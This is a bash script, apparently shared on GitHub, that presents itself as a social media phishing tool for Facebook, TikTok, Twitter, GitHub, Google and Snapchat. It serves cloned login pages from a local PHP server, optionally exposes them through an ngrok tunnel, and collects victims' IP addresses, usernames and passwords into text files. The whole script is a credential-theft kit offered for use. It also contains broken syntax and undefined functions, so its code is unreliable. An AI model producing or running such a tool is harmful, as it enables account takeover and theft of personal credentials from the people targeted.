#!/bin/bash
## Coded : by Prince Gutierrez
## Github : https://github.com/PDGHACK-10
## Version : 1.0.2
## about this tool : SOCIAL MEDIA PHISHING TOOL
## YOUTUBE CHANNEL : PDGHACK-12
blue='\033[31;1m'
red='\033[32;1m'
green='\033[33;1m'
white='\033[34;1m'

dependencies() {

command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v openssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's not installed. Install it. Aborting."; exit 1; }
 

}





main_menu() {

echo -e $red |||||||||||||||||||||||||||||||CODED  BY  PRINCE GUTIERREZ||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |||| ||||||||||||||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |01| ||||FACEBOOK||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |02| ||||TIKTOK  ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |03| ||||TWITTER ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |04| ||||GITHUB  ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |05| ||||GOOGLE  ||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |06| ||||SNAPCHAT||||||||||||||||||||||||
echo -e $red |||||||||||||||||||||||||||||||||||| |||| ||||||||||||||||||||||||||||||||||||
read -p $red "ENTER SOCIAL MEDIA TO HACK " hug

if [[ $hug == 1 || $hug == 01 ]]; then
website="facebook"
tunnel_menu

elif [[ $hug == 2 || $hug == 02 ]]; then
website="tiktok"
tunnel_menu

elif [[ $hug == 3 || $hug == 03 ]]; then
website="twitter"
tunnel_menu

elif [[ $hug == 4 || $hug == 04 ]]; then
website="github"
tunnel_menu

elif [[ $hug == 5 || $hug == 05 ]]; then
website="google"
tunnel_menu

elif [[ $hug == 6 || $hug == 06 ]]; then
website="snapchat"
tunnel_menu
fi

}


checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
                             
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e $red  SETTING NOW SERVER
	cp -rf sites/"$website"/* .server/www
	cp -f sites/ip.php .server/www/
	echo -e STARING NOW PHP SERVER
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e $red VICTIM PASSWORD FOUND $IP"
	echo -e $red Saved in : pass.txt"
	cat .server/www/pass.txt >> pass.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e $red Account : $ACCOUNT"
	echo -e $red Password : $PASSWORD"
	echo -e $red Saved in : usernames.txt"
	cat .server/www/usernames.txt >> usernames.txt
	echo -e $red Waiting for Next Login Info, $blueCtrl + C $green to exit. "
}

## Print data
capture_data() {
	echo -e $red Waiting for Login Info, $blue Ctrl + C $white to exit..."
	while true; do
		if [[ -e ".server/www/pass.txt" ]]; then
			echo -e $red Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e $red Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

### Tunnel selection
tunnel_menu() {

echo -e $red  	     Localhost
echo -e $red         Ngrok

	EOF

	read -p " Select a port forwarding service : " REPLY

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok
	else
		echo -e $blue Invalid Option, Try Again..."
		sleep 1 
                tunnel_menu 
	fi
}

dependencies
main_menu
ngrok_server
